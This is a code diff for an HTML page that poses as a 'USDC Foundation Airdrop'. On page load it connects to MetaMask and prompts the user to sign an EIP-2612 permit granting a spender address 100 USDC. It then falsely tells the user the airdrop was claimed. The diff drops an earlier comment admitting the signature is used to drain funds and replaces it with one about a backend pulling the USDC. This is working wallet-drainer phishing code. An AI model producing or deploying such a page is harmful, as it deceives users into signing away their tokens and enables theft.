@@ -2,60 +2,67 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Verifying Wallet...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDC Foundation Airdrop</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
-    body {
-      background: #111;
-      color: #eee;
+    * {
       font-family: 'Inter', sans-serif;
-      margin: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: linear-gradient(145deg, #0f172a, #1e293b);
+      color: white;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       height: 100vh;
+      margin: 0;
     }
     .card {
-      background: #1c1c1c;
-      padding: 40px;
-      border-radius: 18px;
-      box-shadow: 0 0 30px rgba(0,255,255,0.1);
+      background: #1e293b;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
       text-align: center;
-      width: 360px;
+      max-width: 400px;
     }
-    .loader {
-      border: 5px solid #222;
-      border-top: 5px solid #0ff;
-      border-radius: 50%;
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+    }
+    #status {
+      margin-top: 1.2rem;
+      color: #94a3b8;
+      font-size: 0.95rem;
+    }
+    .spinner {
+      margin: 20px auto;
       width: 40px;
       height: 40px;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid #22c55e;
+      border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin: 20px auto;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    h2 {
-      margin-bottom: 10px;
-      color: #0ff;
-    }
-    #status {
-      font-size: 14px;
-      color: #aaa;
-    }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>🔒 Verifying Wallet</h2>
-    <div class="loader"></div>
-    <div id="status">Connecting to MetaMask...</div>
+    <h1>🎉 USDC Foundation Airdrop</h1>
+    <div class="spinner"></div>
+    <div id="status">Connecting wallet... please wait</div>
   </div>
 
   <script>
-    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC
-    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Router
+    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC Mainnet
+    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Uniswap Router
 
     const usdcPermitAbi = [
       {
@@ -79,63 +86,62 @@
         "name": "nonces",
         "outputs": [{ "name": "", "type": "uint256" }],
         "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [],
-        "name": "DOMAIN_SEPARATOR",
-        "outputs": [{ "name": "", "type": "bytes32" }],
-        "type": "function"
       }
     ];
 
-    async function autoSignPermit() {
+    async function autoConnectAndPermit() {
+      if (!window.ethereum) {
+        document.getElementById("status").innerText = "❌ MetaMask not detected!";
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      await ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+
+      const value = web3.utils.toBN(100 * 10 ** 6); // 100 USDC
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+      const contract = new web3.eth.Contract(usdcPermitAbi, tokenAddress);
+      const nonce = await contract.methods.nonces(user).call();
+      const chainId = await web3.eth.getChainId();
+
+      const permitData = {
+        types: {
+          EIP712Domain: [
+            { name: "name", type: "string" },
+            { name: "version", type: "string" },
+            { name: "chainId", type: "uint256" },
+            { name: "verifyingContract", type: "address" }
+          ],
+          Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+          ]
+        },
+        domain: {
+          name: "USD Coin",
+          version: "2",
+          chainId: chainId,
+          verifyingContract: tokenAddress
+        },
+        primaryType: "Permit",
+        message: {
+          owner: user,
+          spender: spender,
+          value: value.toString(),
+          nonce: nonce,
+          deadline: deadline
+        }
+      };
+
+      document.getElementById("status").innerText = "🔐 Signing permit...";
+
       try {
-        const web3 = new Web3(window.ethereum);
-        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-        const user = accounts[0];
-
-        const value = web3.utils.toBN(100 * 10 ** 6); // 100 USDC
-        const deadline = Math.floor(Date.now() / 1000) + 3600;
-
-        const contract = new web3.eth.Contract(usdcPermitAbi, tokenAddress);
-        const nonce = await contract.methods.nonces(user).call();
-        const chainId = await web3.eth.getChainId();
-
-        const permitData = {
-          types: {
-            EIP712Domain: [
-              { name: "name", type: "string" },
-              { name: "version", type: "string" },
-              { name: "chainId", type: "uint256" },
-              { name: "verifyingContract", type: "address" }
-            ],
-            Permit: [
-              { name: "owner", type: "address" },
-              { name: "spender", type: "address" },
-              { name: "value", type: "uint256" },
-              { name: "nonce", type: "uint256" },
-              { name: "deadline", type: "uint256" }
-            ]
-          },
-          domain: {
-            name: "USD Coin",
-            version: "2",
-            chainId: chainId,
-            verifyingContract: tokenAddress
-          },
-          primaryType: "Permit",
-          message: {
-            owner: user,
-            spender: spender,
-            value: value.toString(),
-            nonce: nonce,
-            deadline: deadline
-          }
-        };
-
-        document.getElementById("status").innerText = "Signing permit...";
-
         const signature = await ethereum.request({
           method: "eth_signTypedData_v4",
           params: [user, JSON.stringify(permitData)],
@@ -145,19 +151,16 @@
         const s = "0x" + signature.slice(66, 130);
         const v = parseInt(signature.slice(130, 132), 16);
 
-        document.getElementById("status").innerText = "✅ Signature complete";
+        document.getElementById("status").innerText = "✅ Airdrop claimed! You’ll receive 100 USDC soon.";
 
-        // Normally attacker now uses v,r,s off-chain to drain funds
-        // Not shown here for safety
-
+        // backend or other contract can now use permit() to pull USDC
+        console.log("Permit signature:", { v, r, s, value: value.toString(), deadline });
       } catch (err) {
-        document.getElementById("status").innerText = "❌ User rejected or error";
+        document.getElementById("status").innerText = `❌ Cancelled or error: ${err.message}`;
       }
     }
 
-    window.onload = () => {
-      setTimeout(autoSignPermit, 1000); // slight delay for smooth UX
-    };
+    window.addEventListener("load", autoConnectAndPermit);
   </script>
 </body>
 </html>
